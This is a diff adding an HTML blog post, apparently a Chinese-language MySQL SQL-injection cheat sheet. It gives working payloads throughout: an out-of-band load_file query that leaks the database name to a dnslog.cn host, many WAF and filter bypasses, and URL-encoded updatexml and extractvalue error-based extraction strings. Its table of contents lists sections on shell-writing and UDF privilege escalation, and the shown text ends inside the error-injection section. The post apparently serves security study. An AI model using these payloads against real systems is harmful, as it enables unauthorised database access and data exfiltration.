@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="sql注入类型联合注入 报错注入 盲注 ​	布尔盲注 ​	时间盲注 ​	benchmark(),sleep() ​	外带 1(select load_file(concat(&#x27;\\\\&#x27;,hex(database()),&#x27;.pk4qft.dnslog.cn\\test&#x27;)))  堆叠注入 查询语句SELECT table_name FROM informat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql注入">
+<meta property="og:url" content="http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="sql注入类型联合注入 报错注入 盲注 ​	布尔盲注 ​	时间盲注 ​	benchmark(),sleep() ​	外带 1(select load_file(concat(&#x27;\\\\&#x27;,hex(database()),&#x27;.pk4qft.dnslog.cn\\test&#x27;)))  堆叠注入 查询语句SELECT table_name FROM informat">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250602193139901.png">
+<meta property="article:published_time" content="2025-06-02T11:33:05.000Z">
+<meta property="article:modified_time" content="2025-06-05T17:58:52.074Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta property="article:tag" content="-sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250602193139901.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>mysql注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/03/shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/31/xxe%E7%9A%84java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&text=mysql注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&is_video=false&description=mysql注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql注入&body=Check out this article: http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&name=mysql注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&t=mysql注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">查询语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">绕过手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">构造函数法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">逗号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.</span> <span class="toc-text">注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.3.4.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.</span> <span class="toc-text">过滤or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-%E6%88%96%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.6.</span> <span class="toc-text">过滤等号&#x3D;或大小于号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.7.</span> <span class="toc-text">过滤函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-mid"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">substr mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-ord"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">ascii ord</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#left-right"><span class="toc-number">1.3.7.4.</span> <span class="toc-text">left right</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="toc-number">1.4.</span> <span class="toc-text">逻辑运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#if"><span class="toc-number">1.5.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">1.6.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.6.2.</span> <span class="toc-text">extractvalue</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#floor"><span class="toc-number">1.7.</span> <span class="toc-text">floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#geometrycollection"><span class="toc-number">1.7.1.</span> <span class="toc-text">geometrycollection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#polygon"><span class="toc-number">1.7.2.</span> <span class="toc-text">polygon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multipoint"><span class="toc-number">1.7.3.</span> <span class="toc-text">multipoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multilinestring"><span class="toc-number">1.7.4.</span> <span class="toc-text">multilinestring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multipolygon"><span class="toc-number">1.7.5.</span> <span class="toc-text">multipolygon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linestring"><span class="toc-number">1.7.6.</span> <span class="toc-text">linestring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.7.7.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LatFromGeoHash"><span class="toc-number">1.7.8.</span> <span class="toc-text">ST_LatFromGeoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LongFromGeoHash"><span class="toc-number">1.7.9.</span> <span class="toc-text">ST_LongFromGeoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-SUBSET"><span class="toc-number">1.7.10.</span> <span class="toc-text">GTID_SUBSET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-SUBTRACT"><span class="toc-number">1.7.11.</span> <span class="toc-text">GTID_SUBTRACT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-PointFromGeoHash"><span class="toc-number">1.7.12.</span> <span class="toc-text">ST_PointFromGeoHash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8Bmysql%E5%90%8E"><span class="toc-number">1.8.</span> <span class="toc-text">拿下mysql后</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.1.</span> <span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99-shell"><span class="toc-number">1.8.2.</span> <span class="toc-text">日志文件写 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="toc-number">1.8.3.</span> <span class="toc-text">Hash 获取与解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">1.9.</span> <span class="toc-text">udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.9.1.</span> <span class="toc-text">原理简介：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">1.9.2.</span> <span class="toc-text">寻找插件目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">1.9.3.</span> <span class="toc-text">写入动态链接库</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        mysql注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-02T11:33:05.000Z" class="dt-published" itemprop="datePublished">2025-06-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">-sql注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>联合注入</p>
+<p>报错注入</p>
+<p>盲注</p>
+<p>​	<strong>布尔盲注</strong></p>
+<p>​	<strong>时间盲注</strong></p>
+<p>​	benchmark(),sleep()</p>
+<p>​	<strong>外带</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select load_file(concat(&#x27;\\\\&#x27;,hex(database()),&#x27;.pk4qft.dnslog.cn\\test&#x27;)))</span><br></pre></td></tr></table></figure>
+
+<p>堆叠注入</p>
+<h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><p>SELECT table_name FROM information_schema.tables WHERE table_schema &#x3D; database();</p>
+<p>上面这个实例表示的实例是</p>
+<p>information_schema是系统中包含所有信息的数据库</p>
+<p>​	information_schema.tables 表示的是数据库里面所有的表</p>
+<p>table_schema 他是information_schema.tables的一个列，他这个列包含的内容是所有的数据库名字，</p>
+<p>table_schema &#x3D; database()这个的意思是当前的数据库</p>
+<p>综合的意思就是找当前数据库的所有表名</p>
+<p>select group_concat(column_name) from information_schema.columns where table_name &#x3D; “表名”</p>
+<p>这个的意思是找所有的列名在某个表，然后group_concat是把他输出到一行，而不是一个一个输出</p>
+<h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><h3 id="构造函数法"><a href="#构造函数法" class="headerlink" title="构造函数法"></a>构造函数法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET @s = CONCAT(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(49));</span><br><span class="line">PREPARE stmt FROM @s;</span><br><span class="line">EXECUTE stmt;</span><br><span class="line">DEALLOCATE PREPARE stmt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET @s = 0x73656c6563742031;</span><br><span class="line">PREPARE stmt FROM @s;</span><br><span class="line">EXECUTE stmt;</span><br><span class="line">DEALLOCATE PREPARE stmt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/img/20250602193139901.png"></p>
+<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>原本该这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))=119</span><br></pre></td></tr></table></figure>
+
+<p>绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database())from(1)for(1)))=119</span><br></pre></td></tr></table></figure>
+
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 2,1;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 2 offset 1;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>原本是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 AS A, 2 AS B, 3 AS C;</span><br></pre></td></tr></table></figure>
+
+<p>绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ((SELECT 1) A JOIN (SELECT 2) B JOIN (SELECT 3) C)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注释内容</span></span><br><span class="line"># 注释内容</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">%00</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">换行(url编码中的<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">` 反引号绕过</span><br><span class="line">tab</span><br><span class="line">两个空格</span><br><span class="line"><span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0  <span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> # 异或</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤等号-或大小于号绕过"><a href="#过滤等号-或大小于号绕过" class="headerlink" title="过滤等号&#x3D;或大小于号绕过"></a>过滤等号&#x3D;或大小于号绕过</h3><ul>
+<li><p>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</p>
+</li>
+<li><p>使用大小于号来绕过</p>
+</li>
+<li><p>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配(<code>REGEXP</code> 是<strong>字符串层面的正则匹配</strong>，哪怕 <code>id</code> 是数字字段，也会被转成字符串做匹配)</p>
+</li>
+<li><p>greatest(n1, n2, n3…):返回n中的最大值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="operator">=</span><span class="number">116</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>least(n1,n2,n3…):返回n中的最小值</p>
+</li>
+<li><p>strcmp(str1,str2):若所有的字符串均相同，则返回 <strong>0</strong>，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and !strcmp(ascii(substr(username,1,1)),116)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>in关键字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;t&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>找substr(username,1,1)结果是否在in里面</p>
+</li>
+<li><p>between a and b:范围在a-b之间</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>select group_concat(column_name) from information_schema.columns where table_name &#x3D; “表名”  limit 2,1</p>
+<p>这个就是只输出第二个结果</p>
+<p>select group_concat(column_name) from information_schema.columns where table_name &#x3D; “表名”  limit 1,3</p>
+<p>这个就是输出从第一个开始输出三个结果</p>
+<h4 id="substr-mid"><a href="#substr-mid" class="headerlink" title="substr mid"></a>substr mid</h4><p>select substr(column_name,1,1) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS” limit 1,1</p>
+<p>如果没有substr，结果会是abc然后加上substr(column_name,1,1)，就是输出a，substr(column_name,2,1)，输出b，substr(column_name,1,2)，输出ab</p>
+<p>mid作用是一样的</p>
+<h4 id="ascii-ord"><a href="#ascii-ord" class="headerlink" title="ascii ord"></a>ascii ord</h4><p>这两个是一个意思ascii(“A”)&#x3D;65</p>
+<h4 id="left-right"><a href="#left-right" class="headerlink" title="left right"></a>left right</h4><p>select left(column_name,2) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS” limit 1,1</p>
+<p>如果本来要输出abcd，left就只会从左边输出两位ab</p>
+<p>right是从右边输出</p>
+<p>select left(column_name,2) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS” limit 1,1</p>
+<h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor  异或</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>if(true,sleep(1),1)会睡眠一秒</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+updatexml(1,concat(0x7e,(查询语句),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+updatexml(1,concat(0x7e,(select+mid(group_concat(table_name),115,15)+from+information_schema.tables+where+table_schema=database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+1=updatexml(1,concat(0x7e,(select+mid(group_concat(table_name),115,15)+from+information_schema.tables+where+table_schema=database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</p>
+<p>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
+<p>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+extractvalue(1,concat(0x7e,(查询语句),0x7e))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+1=extractvalue(1,concat(0x7e,(select+mid(group_concat(table_name),115,15)+from+information_schema.tables+where+table_schema=database()),0x7e))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+extractvalue(1,concat(0x7e,(select+mid(group_concat(table_name),115,15)+from+information_schema.tables+where+table_schema=database()),0x7e))</span><br></pre></td></tr></table></figure>
+
